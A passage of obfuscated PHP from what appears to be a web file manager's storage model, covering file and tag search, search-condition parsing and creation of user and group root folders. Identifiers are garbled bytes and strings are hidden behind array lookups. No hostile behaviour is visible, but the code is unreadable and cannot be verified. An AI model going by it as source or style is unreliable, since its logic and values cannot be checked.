$ÓÍöëË; } private function _listSearchFileContent(&$•¦Ì×Ÿ, $ïˆ·ç±¨, $ãõ›üæ¹, $İñ®ÍÈà) { $ï¨³™ÒÛ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$ïˆ·ç±¨[$ï¨³™ÒÛ[2090]] || $•¦Ì×Ÿ[$ï¨³™ÒÛ[445]][$ï¨³™ÒÛ[431]] > 1) { return; } if (!isset($İñ®ÍÈà[$ï¨³™ÒÛ[32]]) || !is_array($ïˆ·ç±¨[$ï¨³™ÒÛ[546]])) { return; } $İñ®ÍÈà[$ï¨³™ÒÛ[546]] = array($ï¨³™ÒÛ[7], $ïˆ·ç±¨[$ï¨³™ÒÛ[546]]); unset($İñ®ÍÈà[$ï¨³™ÒÛ[32]]); unset($ïˆ·ç±¨[$ï¨³™ÒÛ[546]]); $õŞ…ĞçŞ = $this->field($ãõ›üæ¹)->where($İñ®ÍÈà)->limit($ï¨³™ÒÛ[2259])->select(); if (!$õŞ…ĞçŞ || count($õŞ…ĞçŞ) == 0) { return; } $•¦Ì×Ÿ[$ï¨³™ÒÛ[448]] = array_merge($õŞ…ĞçŞ, $•¦Ì×Ÿ[$ï¨³™ÒÛ[448]]); $•¦Ì×Ÿ[$ï¨³™ÒÛ[445]][$ï¨³™ÒÛ[446]] += count($õŞ…ĞçŞ); } private function _listSearchTag(&$Ë„™¹ïà, $Ë‚´ª„œ, $Ğ¸ÔÌ¤ş) { $Ìíõ¦û =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($Ë‚´ª„œ[$Ìíõ¦û[1950]]) || !in_array($Ìíõ¦û[2260], $Ë‚´ª„œ[$Ìíõ¦û[1950]])) { return; } if (!$Ë‚´ª„œ[$Ìíõ¦û[2090]] || $Ë„™¹ïà[$Ìíõ¦û[445]][$Ìíõ¦û[431]] > 1) { return; } $¨ÌãÕç— = Model($Ìíõ¦û[2261])->listData(); $·şËáŞŞ = array(); $ˆè¹’¿¸ = $Ë‚´ª„œ[$Ìíõ¦û[2090]]; foreach ($¨ÌãÕç— as $ÚüÅ‚ö) { $…°¾àªÎ = $ÚüÅ‚ö[$Ìíõ¦û[32]]; $Ë±«« = str_replace($Ìíõ¦û[53], $Ìíõ¦û[12], Pinyin::get($…°¾àªÎ)); if (stripos($…°¾àªÎ, $ˆè¹’¿¸) !== !1 || stripos($Ë±««, $ˆè¹’¿¸) !== !1) { $·şËáŞŞ[] = $ÚüÅ‚ö[$Ìíõ¦û[478]]; } } if (!$·şËáŞŞ) { return; } $æ³Ùè¸§ = array($Ìíõ¦û[503] => array($Ìíõ¦û[7], $·şËáŞŞ), $Ìíõ¦û[1790] => USER_ID); $¯×¥‰× = Model($Ìíõ¦û[505])->field($Ìíõ¦û[87])->where($æ³Ùè¸§)->select(); $¯×¥‰× = array_to_keyvalue($¯×¥‰×, $Ìíõ¦û[12], $Ìíõ¦û[87]); $»¦º¿ÓÙ = array_unique($¯×¥‰×); $this->_listSearchMerge($Ë„™¹ïà, $Ë‚´ª„œ, $Ğ¸ÔÌ¤ş, $»¦º¿ÓÙ); } private function _listSearchDesc(&$‹ÇÑ¸Ú˜, $ƒ–¨¢¦ú, $­„¾ˆÊÕ) { $Ğ“ë®¦× =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($ƒ–¨¢¦ú[$Ğ“ë®¦×[1950]]) || !in_array($Ğ“ë®¦×[529], $ƒ–¨¢¦ú[$Ğ“ë®¦×[1950]])) { return; } if (!$ƒ–¨¢¦ú[$Ğ“ë®¦×[2090]] || $‹ÇÑ¸Ú˜[$Ğ“ë®¦×[445]][$Ğ“ë®¦×[431]] > 1) { return; } $üÃ££í­ = array($Ğ“ë®¦×[97] => $Ğ“ë®¦×[529], $Ğ“ë®¦×[453] => array($Ğ“ë®¦×[462], $Ğ“ë®¦×[2092] . $ƒ–¨¢¦ú[$Ğ“ë®¦×[2090]] . $Ğ“ë®¦×[2092])); $„¥‡×¯– = !1; if ($„¥‡×¯–) { $æÅ¹ˆ = $this->listSearchChildren($ƒ–¨¢¦ú[$Ğ“ë®¦×[193]]); $æÅ¹ˆ = array_unique($æÅ¹ˆ); if (!$æÅ¹ˆ) { return; } $üÃ££í­[$Ğ“ë®¦×[194]] = array($Ğ“ë®¦×[7], $æÅ¹ˆ); } $ãØ‚ŞÕã = Model($Ğ“ë®¦×[640])->field($Ğ“ë®¦×[194])->where($üÃ££í­)->limit(5000)->select(); $¶µšòó = array_to_keyvalue($ãØ‚ŞÕã, $Ğ“ë®¦×[12], $Ğ“ë®¦×[194]); $this->_listSearchMerge($‹ÇÑ¸Ú˜, $ƒ–¨¢¦ú, $­„¾ˆÊÕ, $¶µšòó); } private function _listSearchGroupTag(&$µÏÃæ¦£, $Õçİ¶‘’, $ı¨ö‰˜¢) { $³±óÛµ =& $_SERVER[¼¥ÊĞÙÌ]; if (empty($Õçİ¶‘’[$³±óÛµ[1950]]) || !in_array($³±óÛµ[2260], $Õçİ¶‘’[$³±óÛµ[1950]])) { return; } if (!$Õçİ¶‘’[$³±óÛµ[2090]] || $µÏÃæ¦£[$³±óÛµ[445]][$³±óÛµ[431]] > 1 || !$Õçİ¶‘’[$³±óÛµ[193]]) { return; } $ÏÎŸ‘Š = $this->sourceInfo($Õçİ¶‘’[$³±óÛµ[193]]); if (!$ÏÎŸ‘Š || $ÏÎŸ‘Š[$³±óÛµ[191]] != SourceModel::TYPE_GROUP) { return; } $ÚäÅ¶Ô£ = $ÏÎŸ‘Š[$³±óÛµ[574]]; $ŸÔ±ïŠ¹ = Model($³±óÛµ[2262])->get($ÚäÅ¶Ô£); $µæ¶Ô„… = array(); $–á×™˜ê = $Õçİ¶‘’[$³±óÛµ[2090]]; foreach ($ŸÔ±ïŠ¹[$³±óÛµ[448]] as $Œ›¶ëìö) { $ğë©–ş = $Œ›¶ëìö[$³±óÛµ[32]]; $µÍªğÔ¼ = str_replace($³±óÛµ[53], $³±óÛµ[12], Pinyin::get($ğë©–ş)); if (stripos($ğë©–ş, $–á×™˜ê) !== !1 || stripos($µÍªğÔ¼, $–á×™˜ê) !== !1) { $µæ¶Ô„…[] = $Œ›¶ëìö[$³±óÛµ[478]]; } } if (!$µæ¶Ô„…) { return; } $”ù©Ö‰ü = array($³±óÛµ[503] => array($³±óÛµ[7], $µæ¶Ô„…), $³±óÛµ[1790] => 0, $³±óÛµ[33] => $³±óÛµ[1398] . $ÚäÅ¶Ô£); $¢çùõÌ = Model($³±óÛµ[505])->field($³±óÛµ[87])->where($”ù©Ö‰ü)->select(); $¢çùõÌ = array_to_keyvalue($¢çùõÌ, $³±óÛµ[12], $³±óÛµ[87]); $¨˜†È€¦ = array_unique($¢çùõÌ); $this->_listSearchMerge($µÏÃæ¦£, $Õçİ¶‘’, $ı¨ö‰˜¢, $¨˜†È€¦); } private function _listSearchMerge(&$Õ·Õù”™, $ÒºÉ»Â, $Èè§€½, $€±§ìù) { $†²ÁÈüƒ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$€±§ìù) { return; } $èï˜®¤ = array_to_keyvalue($Õ·Õù”™[$†²ÁÈüƒ[448]], $†²ÁÈüƒ[12], $†²ÁÈüƒ[194]); $¢¢‘¦½€ = array_diff($€±§ìù, $èï˜®¤); if (!$¢¢‘¦½€) { return; } $éÊÍß–Ó = array($†²ÁÈüƒ[194] => array($†²ÁÈüƒ[7], $¢¢‘¦½€)); $á½ê‹ˆ = $this->field($Èè§€½)->where($éÊÍß–Ó)->select(); if (!$á½ê‹ˆ) { return; } $›şÓµÚ¸ = array(); foreach ($á½ê‹ˆ as $„Ê¨êÈº) { if ($this->_listSearchFilter($„Ê¨êÈº, $ÒºÉ»Â)) { $›şÓµÚ¸[] = $„Ê¨êÈº; } } $Õ·Õù”™[$†²ÁÈüƒ[448]] = array_merge($›şÓµÚ¸, $Õ·Õù”™[$†²ÁÈüƒ[448]]); $Õ·Õù”™[$†²ÁÈüƒ[445]][$†²ÁÈüƒ[446]] += count($›şÓµÚ¸); } private function _listSearchFilter($·ùñ²æ, $ÂŒ€†ë) { $²ƒ…á¢ =& $_SERVER[¼¥ÊĞÙÌ]; $‘§àŠÎ = $·ùñ²æ[$²ƒ…á¢[488]] == $²ƒ…á¢[91]; if (!strstr($·ùñ²æ[$²ƒ…á¢[589]], $²ƒ…á¢[50] . $ÂŒ€†ë[$²ƒ…á¢[193]] . $²ƒ…á¢[50])) { return !1; } if (isset($ÂŒ€†ë[$²ƒ…á¢[489]]) && $ÂŒ€†ë[$²ƒ…á¢[489]] != $²ƒ…á¢[850]) { if ($ÂŒ€†ë[$²ƒ…á¢[489]] == $²ƒ…á¢[78] && !$‘§àŠÎ) { return !1; } if ($ÂŒ€†ë[$²ƒ…á¢[489]] != $²ƒ…á¢[78] && $‘§àŠÎ) { return !1; } if (!strstr($·ùñ²æ[$²ƒ…á¢[169]], $²ƒ…á¢[50] . $ÂŒ€†ë[$²ƒ…á¢[489]] . $²ƒ…á¢[50])) { return !1; } } if (isset($ÂŒ€†ë[$²ƒ…á¢[2263]]) && $ÂŒ€†ë[$²ƒ…á¢[2263]] < $·ùñ²æ[$²ƒ…á¢[79]]) { return !1; } if (isset($ÂŒ€†ë[$²ƒ…á¢[2264]]) && $ÂŒ€†ë[$²ƒ…á¢[2264]] > $·ùñ²æ[$²ƒ…á¢[79]]) { return !1; } if (isset($ÂŒ€†ë[$²ƒ…á¢[670]]) && $ÂŒ€†ë[$²ƒ…á¢[670]] != $·ùñ²æ[$²ƒ…á¢[532]]) { return !1; } return !0; } public function listSearchChildren($Ãğ¯Ãù©, $Ï”Ğ›… = 5000) { $Š¯˜Æ°‡ =& $_SERVER[¼¥ÊĞÙÌ]; $Û³“øï¦ = array(); $®¤õ¯Ø = $this->sourceInfo($Ãğ¯Ãù©); $æ„êŞ¯ç = array($Š¯˜Æ°‡[589] => array($Š¯˜Æ°‡[462], $®¤õ¯Ø[$Š¯˜Æ°‡[589]] . $®¤õ¯Ø[$Š¯˜Æ°‡[194]] . $Š¯˜Æ°‡[621])); $‹¡÷²•İ = $this->field($Š¯˜Æ°‡[79])->where($æ„êŞ¯ç)->limit($Ï”Ğ›… + 1)->select(); $³ùÉÔ›ê = is_array($‹¡÷²•İ) ? count($‹¡÷²•İ) : 0; if ($³ùÉÔ›ê > $Ï”Ğ›…) { return $this->_listSearchChildrenNear($Ãğ¯Ãù©, $Ï”Ğ›…); } $ª…Œ‡¢ = $this->field($Š¯˜Æ°‡[194])->where($æ„êŞ¯ç)->select(); $Û³“øï¦ = array_to_keyvalue($ª…Œ‡¢, $Š¯˜Æ°‡[12], $Š¯˜Æ°‡[194]); return $Û³“øï¦; } private function _listSearchChildrenNear($¥öÊş‰Ü, $Ùå½İâ‰) { $æĞÜ‘÷ =& $_SERVER[¼¥ÊĞÙÌ]; $¨²®Œß¡ = array(); $€É¿ïÊ· = array($æĞÜ‘÷[193] => $¥öÊş‰Ü); $ôı—óÁÉ = $this->field($æĞÜ‘÷[2265])->where($€É¿ïÊ·)->select(); $ŠÙîÓ = array_to_keyvalue(array_filter_by_field($ôı—óÁÉ, $æĞÜ‘÷[488], $æĞÜ‘÷[91]), $æĞÜ‘÷[12], $æĞÜ‘÷[194]); $¨²®Œß¡ = array_merge($¨²®Œß¡, array_to_keyvalue($ôı—óÁÉ, $æĞÜ‘÷[12], $æĞÜ‘÷[194])); if (!$ŠÙîÓ) { return $¨²®Œß¡; } $€É¿ïÊ· = array($æĞÜ‘÷[193] => array($æĞÜ‘÷[7], $ŠÙîÓ)); $ôı—óÁÉ = $this->field($æĞÜ‘÷[2265])->where($€É¿ïÊ·)->limit($Ùå½İâ‰)->select(); $¨²®Œß¡ = array_merge($¨²®Œß¡, array_to_keyvalue($ôı—óÁÉ, $æĞÜ‘÷[12], $æĞÜ‘÷[194])); $¨²®Œß¡ = array_slice($¨²®Œß¡, 0, intval($Ùå½İâ‰)); return $¨²®Œß¡; } private function _listSearchBindPinyin($¡š˜ƒÌ, &$õÓ¢ä™Í, &$×Ø©è‡Ø) { $‡ÚÎ©„› =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($¡š˜ƒÌ[$‡ÚÎ©„›[2090]]) || !$¡š˜ƒÌ[$‡ÚÎ©„›[2090]]) { return; } if (!Input::check($¡š˜ƒÌ[$‡ÚÎ©„›[2090]], $‡ÚÎ©„›[396]) || strlen($¡š˜ƒÌ[$‡ÚÎ©„›[2090]]) < 2) { return; } $ÕæÃûö  = "\114\105\106\124\40\112\x4f\x49\x4e\x20{$this->tablePrefix}\151\x6f\137\x73\157\165\162\x63\145\x5f\x6d\x65\x74\x61\x20\155\145\x74\x61\x20\x6f\156\40\x73\x6f\x75\x72\x63\145\x2e\x73\157\165\162\143\145\111\x44\40\x3d\x20\x6d\145\x74\141\x2e\163\x6f\x75\162\x63\145\111\x44"; $ÙÕåÚ = array(); $×Ø©è‡Ø = str_replace(array($‡ÚÎ©„›[288], $‡ÚÎ©„›[53], $‡ÚÎ©„›[2266]), $‡ÚÎ©„›[12], $×Ø©è‡Ø); $×Ø©è‡Ø = $‡ÚÎ©„›[514] . str_replace($‡ÚÎ©„›[50], $‡ÚÎ©„›[515], $×Ø©è‡Ø); $á¹ÒĞøÏ = $õÓ¢ä™Í[$‡ÚÎ©„›[32]]; unset($õÓ¢ä™Í[$‡ÚÎ©„›[32]]); foreach ($õÓ¢ä™Í as $ïÚ¬Ò¨À => $‹¡÷Éµ°) { $ÙÕåÚ[$‡ÚÎ©„›[514] . $ïÚ¬Ò¨À] = $‹¡÷Éµ°; } foreach ($á¹ÒĞøÏ as $‡„ï×) { $ÙÕåÚ[] = array($‡ÚÎ©„›[519] => $‡„ï×, $‡ÚÎ©„›[1086] => $‡ÚÎ©„›[2094], array($‡ÚÎ©„›[2267] => $‡„ï×, $‡ÚÎ©„›[2268] => array($‡ÚÎ©„›[7], array($‡ÚÎ©„›[541], $‡ÚÎ©„›[540])))); } $this->join($ÕæÃûö ); $õÓ¢ä™Í = $ÙÕåÚ; } private function _parseSearchWhere($ò Œß½) { $ˆÉ­ Ë› =& $_SERVER[¼¥ÊĞÙÌ]; $·â‡“³ = array(); if (isset($ò Œß½[$ˆÉ­ Ë›[834]]) && $ò Œß½[$ˆÉ­ Ë›[834]]) { $·â‡“³[$ˆÉ­ Ë›[88]] = array($ˆÉ­ Ë›[2269], $ò Œß½[$ˆÉ­ Ë›[834]]); } if (isset($ò Œß½[$ˆÉ­ Ë›[835]]) && $ò Œß½[$ˆÉ­ Ë›[835]]) { $¹öã¸°Õ = array($ˆÉ­ Ë›[2270], $ò Œß½[$ˆÉ­ Ë›[835]]); if ($·â‡“³[$ˆÉ­ Ë›[88]]) { $·â‡“³[$ˆÉ­ Ë›[88]] = array($·â‡“³[$ˆÉ­ Ë›[88]], $¹öã¸°Õ, $ˆÉ­ Ë›[2271]); } else { $·â‡“³[$ˆÉ­ Ë›[88]] = $¹öã¸°Õ; } } if (isset($ò Œß½[$ˆÉ­ Ë›[2263]]) && $ò Œß½[$ˆÉ­ Ë›[2263]] > 0) { $·â‡“³[$ˆÉ­ Ë›[79]] = array($ˆÉ­ Ë›[2269], $ò Œß½[$ˆÉ­ Ë›[2263]]); } if (isset($ò Œß½[$ˆÉ­ Ë›[2264]]) && $ò Œß½[$ˆÉ­ Ë›[2264]]) { $¹öã¸°Õ = array($ˆÉ­ Ë›[2270], $ò Œß½[$ˆÉ­ Ë›[2264]]); if ($·â‡“³[$ˆÉ­ Ë›[79]]) { $·â‡“³[$ˆÉ­ Ë›[79]] = array($·â‡“³[$ˆÉ­ Ë›[79]], $¹öã¸°Õ, $ˆÉ­ Ë›[2271]); } else { $·â‡“³[$ˆÉ­ Ë›[79]] = $¹öã¸°Õ; } } if (isset($ò Œß½[$ˆÉ­ Ë›[670]]) && $ò Œß½[$ˆÉ­ Ë›[670]]) { $·â‡“³[] = array($ˆÉ­ Ë›[532] => $ò Œß½[$ˆÉ­ Ë›[670]], $ˆÉ­ Ë›[530] => $ò Œß½[$ˆÉ­ Ë›[670]], $ˆÉ­ Ë›[1086] => $ˆÉ­ Ë›[2094]); } if (isset($ò Œß½[$ˆÉ­ Ë›[489]]) && $ò Œß½[$ˆÉ­ Ë›[489]]) { $¦êøÂÌ³ = $ò Œß½[$ˆÉ­ Ë›[489]]; if ($¦êøÂÌ³ == $ˆÉ­ Ë›[78]) { $·â‡“³[$ˆÉ­ Ë›[488]] = 1; } else { if ($¦êøÂÌ³ == $ˆÉ­ Ë›[2272]) { $·â‡“³[$ˆÉ­ Ë›[488]] = 0; } else { if ($¦êøÂÌ³) { $¦êøÂÌ³ = is_array($¦êøÂÌ³) ? $¦êøÂÌ³ : explode($ˆÉ­ Ë›[50], $¦êøÂÌ³); $·â‡“³[$ˆÉ­ Ë›[489]] = array($ˆÉ­ Ë›[495], $¦êøÂÌ³); $·â‡“³[$ˆÉ­ Ë›[488]] = 0; } } } } $this->_parseSearchParent($ò Œß½, $·â‡“³); if (isset($ò Œß½[$ˆÉ­ Ë›[2090]]) && trim($ò Œß½[$ˆÉ­ Ë›[2090]])) { $ıŠñ§Ñ = trim($ò Œß½[$ˆÉ­ Ë›[2090]]); $ˆÅµÂ÷ = explode($ˆÉ­ Ë›[53], $ıŠñ§Ñ); if (strlen($ıŠñ§Ñ) > 2 && (substr($ıŠñ§Ñ, 0, 1) == $ˆÉ­ Ë›[121] && substr($ıŠñ§Ñ, -1) == $ˆÉ­ Ë›[121]) || substr($ıŠñ§Ñ, 0, 1) == $ˆÉ­ Ë›[58] && substr($ıŠñ§Ñ, -1) == $ˆÉ­ Ë›[58]) { $ıŠñ§Ñ = substr($ıŠñ§Ñ, 1, -1); $ˆÅµÂ÷ = array($ıŠñ§Ñ); } $·â‡“³[$ˆÉ­ Ë›[32]] = array(array($ˆÉ­ Ë›[620], $ˆÉ­ Ë›[2092] . $ıŠñ§Ñ . $ˆÉ­ Ë›[2092])); if (count($ˆÅµÂ÷) > 1) { $·â‡“³[$ˆÉ­ Ë›[32]] = array(); foreach ($ˆÅµÂ÷ as $œÆ‡ó§ô) { if (!trim($œÆ‡ó§ô)) { continue; } $·â‡“³[$ˆÉ­ Ë›[32]][] = array($ˆÉ­ Ë›[620], $ˆÉ­ Ë›[2092] . trim($œÆ‡ó§ô) . $ˆÉ­ Ë›[2092]); } } } return $·â‡“³; } private function _parseSearchParent($±ØÓ¹« , &$Öíçı¡ª) { $Ù©ë´¾ =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($±ØÓ¹« [$Ù©ë´¾[193]]) || !$±ØÓ¹« [$Ù©ë´¾[193]]) { return; } $×´ÔĞ = $this->pathInfo($±ØÓ¹« [$Ù©ë´¾[193]]); $¿ú•¾®× = $×´ÔĞ[$Ù©ë´¾[193]] . $Ù©ë´¾[12] === $Ù©ë´¾[231]; $ÍµşüÙ¸ = $×´ÔĞ[$Ù©ë´¾[191]] == $Ù©ë´¾[583]; if ($×´ÔĞ[$Ù©ë´¾[599]] == $Ù©ë´¾[600]) { $ØÈĞ¢Ó = $this->sourceInfo($±ØÓ¹« [$Ù©ë´¾[193]]); $×´ÔĞ[$Ù©ë´¾[589]] = $ØÈĞ¢Ó[$Ù©ë´¾[589]]; } $Öíçı¡ª[$Ù©ë´¾[660]] = array($Ù©ë´¾[620], $×´ÔĞ[$Ù©ë´¾[589]] . $±ØÓ¹« [$Ù©ë´¾[193]] . $Ù©ë´¾[621]); $İ‰š¤Æ = isset($±ØÓ¹« [$Ù©ë´¾[1950]]) && in_array($Ù©ë´¾[583], $±ØÓ¹« [$Ù©ë´¾[1950]]); if (!$İ‰š¤Æ || !$ÍµşüÙ¸ || !$¿ú•¾®× || !$×´ÔĞ[$Ù©ë´¾[490]]) { return; } if (!AuthModel::authCheckRoot($×´ÔĞ[$Ù©ë´¾[490]][$Ù©ë´¾[491]])) { return; } $‰ÁâÒ»¸ = $×´ÔĞ[$Ù©ë´¾[574]] . $Ù©ë´¾[12]; if ($‰ÁâÒ»¸ == $Ù©ë´¾[91]) { unset($Öíçı¡ª[$Ù©ë´¾[660]]); $Öíçı¡ª[$Ù©ë´¾[191]] = self::TYPE_GROUP; return; } $ÀÑ§ƒÍÓ = Model($Ù©ë´¾[590])->groupChildrenAll($‰ÁâÒ»¸); $Í¶‹ˆèÔ = count($ÀÑ§ƒÍÓ); if ($Í¶‹ˆèÔ <= 1) { return; } $ï»ÏÑô = array($Ù©ë´¾[193] => 0, $Ù©ë´¾[191] => self::TYPE_GROUP, $Ù©ë´¾[574] => array($Ù©ë´¾[7], $ÀÑ§ƒÍÓ)); $ µçÂÀ = $this->field($Ù©ë´¾[2273])->where($ï»ÏÑô)->limit($Í¶‹ˆèÔ)->select(); $Öíçı¡ª[$Ù©ë´¾[660]] = array(); foreach ($ µçÂÀ as $³¸É»¯õ) { $Öíçı¡ª[$Ù©ë´¾[660]][] = array($Ù©ë´¾[620], $Ù©ë´¾[598] . $³¸É»¯õ[$Ù©ë´¾[194]] . $Ù©ë´¾[621]); } $Öíçı¡ª[$Ù©ë´¾[660]][] = $Ù©ë´¾[2094]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ãŒ»éĞ´) { $üëŞ–£­ =& $_SERVER[¼¥ÊĞÙÌ]; $„ªùŞŠõ = Model($üëŞ–£­[582])->where(array($üëŞ–£­[1781] => $ãŒ»éĞ´))->find(); $íæ­ªğÆ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ãŒ»éĞ´, $„ªùŞŠõ[$üëŞ–£­[32]]); $this->userDesktopAdd($íæ­ªğÆ); return $íæ­ªğÆ; } public function userDesktopAdd($ËÉËèĞß) { $™èàı¯ =& $_SERVER[¼¥ÊĞÙÌ]; $ÙáÎü—¯ = LNG($™èàı¯[2274]); $Ëí¼ìš = $this->mkdir($ËÉËèĞß, $ÙáÎü—¯); $this->metaSet($Ëí¼ìš, $™èàı¯[2275], $™èàı¯[91]); $this->metaSet($ËÉËèĞß, $™èàı¯[2276], $Ëí¼ìš); } public function userPathSafeAdd($û¶ª‰ö÷) { $àûà´Ôˆ =& $_SERVER[¼¥ÊĞÙÌ]; $Öú‘÷÷¦ = Model($àûà´Ôˆ[582])->getInfoFull($û¶ª‰ö÷); if (!$Öú‘÷÷¦) { return !1; } if (_get($Öú‘÷÷¦, $àûà´Ôˆ[603])) { return $Öú‘÷÷¦[$àûà´Ôˆ[544]][$àûà´Ôˆ[2277]]; } $í®¯³¹ = $this->_mkdirRoot(SourceModel::TYPE_USER, $û¶ª‰ö÷, $àûà´Ôˆ[2278], $àûà´Ôˆ[2279]); Model($àûà´Ôˆ[582])->metaSet($û¶ª‰ö÷, $àûà´Ôˆ[2277], $í®¯³¹); $this->metaSet($í®¯³¹, $àûà´Ôˆ[2280], $û¶ª‰ö÷); return $í®¯³¹; } public function userPathAppAdd($ƒš¿ÏÄŸ, $Ãöòşƒ = '', $“Ê¼Å¨‹ = '') { $™¤ŸÀôÊ =& $_SERVER[¼¥ÊĞÙÌ]; $‚»šøÕø = Model($™¤ŸÀôÊ[582])->getInfoFull($ƒš¿ÏÄŸ); if (!$‚»šøÕø) { return !1; } $«íõóšá = $‚»šøÕø[$™¤ŸÀôÊ[544]] ? $‚»šøÕø[$™¤ŸÀôÊ[544]] : array(); $È“’úîÍ = $«íõóšá[$™¤ŸÀôÊ[2281]]; if (!$È“’úîÍ) { $È“’úîÍ = $this->_mkdirRoot(SourceModel::TYPE_USER, $ƒš¿ÏÄŸ, $™¤ŸÀôÊ[2282], $™¤ŸÀôÊ[2283]); Model($™¤ŸÀôÊ[582])->metaSet($ƒš¿ÏÄŸ, $™¤ŸÀôÊ[2281], $È“’úîÍ . $™¤ŸÀôÊ[12]); $this->metaSet($È“’úîÍ, $™¤ŸÀôÊ[2281], $ƒš¿ÏÄŸ); } if (!$Ãöòşƒ) { return $È“’úîÍ; } $ŠËÇ‘¡µ = $«íõóšá[$™¤ŸÀôÊ[2284] . $Ãöòşƒ]; if (!$ŠËÇ‘¡µ) { $ŠËÇ‘¡µ = $this->mkdir($È“’úîÍ, $Ãöòşƒ); Model($™¤ŸÀôÊ[582])->metaSet($ƒš¿ÏÄŸ, $™¤ŸÀôÊ[2284] . $Ãöòşƒ, $ŠËÇ‘¡µ); $this->metaSet($ŠËÇ‘¡µ, $™¤ŸÀôÊ[2284] . $Ãöòşƒ, $ƒš¿ÏÄŸ); } if (!$“Ê¼Å¨‹) { return $ŠËÇ‘¡µ; } $ü­À†Õ° = $this->mkdir($ŠËÇ‘¡µ, $“Ê¼Å¨‹); return $ü­À†Õ°; } public function groupRootAdd($Ôğˆ±Çı) { $õÚÓ…õ =& $_SERVER[¼¥ÊĞÙÌ]; $«ô›”Î = Model($õÚÓ…õ[590])->where(array($õÚÓ…õ[2081] => $Ôğˆ±Çı))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Ôğˆ±Çı, $«ô›”Î[$õÚÓ…õ[32]]); } public function systemRootPathAdd($ëÉ¶ĞÌ¦) { if ($ëÉ¶ĞÌ¦ != $_SERVER[¼¥ÊĞÙÌ][613]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ëÉ¶ĞÌ¦); } public function userRootRemove($©ÅÛ’åí) { $Ì«‰íêğ = $this->targetSourceRoot(SourceModel::TYPE_USER, $©ÅÛ’åí, !0); foreach ($Ì«‰íêğ as $”Ä¸Îµ) { if (!$”Ä¸Îµ) { continue; } $this->remove($”Ä¸Îµ[$_SERVER[¼¥ÊĞÙÌ][194]], !1); } } public function groupRootRemove($ÔşØãè¸) { $Î˜Ôº ™ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $ÔşØãè¸); if (!$Î˜Ôº ™) { return; } $this->remove($Î˜Ôº ™[$_SERVER[¼¥ÊĞÙÌ][194]], !1); } private function _mkdirRoot($è¶ÎÎË, $§´™Ø–Ë, $Œ¸Ëğµß, $ö¦íŒ£ = '') { $‰•îÂ€ê =& $_SERVER[¼¥ÊĞÙÌ]; $Ïüá¼Šº = defined($‰•îÂ€ê[2219]) ? USER_ID : 0; $ÅÌµˆ’ = array($‰•îÂ€ê[480] => 0, $‰•îÂ€ê[656] => $è¶ÎÎË, $‰•îÂ€ê[657] => $§´™Ø–Ë, $‰•îÂ€ê[654] => 1, $‰•îÂ€ê[658] => $Ïüá¼Šº, $‰•îÂ€ê[659] => $Ïüá¼Šº, $‰•îÂ€ê[655] => $ö¦íŒ£, $‰•îÂ€ê[660] => $‰•îÂ€ê[598], $‰•îÂ€ê[507] => 0, $‰•îÂ€ê[625] => 0, $‰•îÂ€ê[547] => 0, $‰•îÂ€ê[661] => $‰•îÂ€ê[12]); if ($¼„•ÏŸ’ = $this->where($ÅÌµˆ’)->find()) { return $¼„•ÏŸ’[$‰•îÂ€ê[194]]; } $Œã„‹‰é = "\x4d\x6f\144\x65\x6c\x53\x6f\165\162\x63\x65\x2e\155\x6b\144\151\x72\122\157\157\x74\x2e{$è¶ÎÎË}\x2e{$§´™Ø–Ë}\x2e" . $Œ¸Ëğµß; CacheLock::lock($Œã„‹‰é); $ÅÌµˆ’[$‰•îÂ€ê[32]] = $Œ¸Ëğµß; $«„¿àí• = $this->add($ÅÌµˆ’); $©ùĞ»åò = array($‰•îÂ€ê[662] => short_id($«„¿àí•)); $this->where(array($‰•îÂ€ê[494] => $«„¿àí•))->save($©ùĞ»åò); CacheLock::unlock($Œã„‹‰é); return $«„¿àí•; } private function targetSourceRoot($˜§ ß«´, $ İˆÑÃà, $¥ç¤–ËÀ = false) { $˜ù¾üº· =& $_SERVER[¼¥ÊĞÙÌ]; $¨²ï†³Î = array($˜ù¾üº·[480] => 0, $˜ù¾üº·[656] => $˜§ ß«´, $˜ù¾üº·[657] => $ İˆÑÃà); if ($¥ç¤–ËÀ) { $Ø¬Àı¥Å = $this->where($¨²ï†³Î)->select(); return $Ø¬Àı¥Å ? $Ø¬Àı¥Å : array(); } $ßïÊ£ì = $this->where($¨²ï†³Î)->find(); return $ßïÊ£ì ? $ßïÊ£ì : array(); } public function sourceRootGroup($ñ˜›óªÎ) { $©¥°Ÿå’ =& $_SERVER[¼¥ÊĞÙÌ]; if (is_string($ñ˜›óªÎ)) { $ñ˜›óªÎ = array($ñ˜›óªÎ); } $³¨ô±ë  = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ñ˜›óªÎ, $©¥°Ÿå’[223]); $ª˜½ÈÃ£ = array($©¥°Ÿå’[448] => $³¨ô±ë , $©¥°Ÿå’[445] => array($©¥°Ÿå’[832] => count($ñ˜›óªÎ))); $this->_listDataApply($ª˜½ÈÃ£[$©¥°Ÿå’[448]]); $this->_listMake($ª˜½ÈÃ£); return array_to_keyvalue($ª˜½ÈÃ£[$©¥°Ÿå’[85]], $©¥°Ÿå’[574]); } public function mkfile($Ç²¾üĞì, $–Æ¢Üİß, $ÌÑ¡ğ Õ = '', $×µ¿‚è‡ = REPEAT_RENAME) { $ŠÏúç°› =& $_SERVER[¼¥ÊĞÙÌ]; $¨ıµÇ×´ = KodIO::ioFileDriverGet($ŠÏúç°›[486] . $Ç²¾üĞì . $ŠÏúç°›[405]); $ÉˆáÑ  = Model($ŠÏúç°›[682])->addFileByContent($ÌÑ¡ğ Õ, $¨ıµÇ×´, $–Æ¢Üİß); return $this->_createFileCall($Ç²¾üĞì, $–Æ¢Üİß, $ÉˆáÑ , $×µ¿‚è‡, $ŠÏúç°›[1450]); } public function addFile($È…½˜éø, $Íë—•ù¸, $©Ù¨åƒ¾, $ ²øŸƒÉ = false, $’×ÏÈŒé = REPEAT_RENAME) { $¶å€Üü€ =& $_SERVER[¼¥ÊĞÙÌ]; $‰¬Ñ§€ä 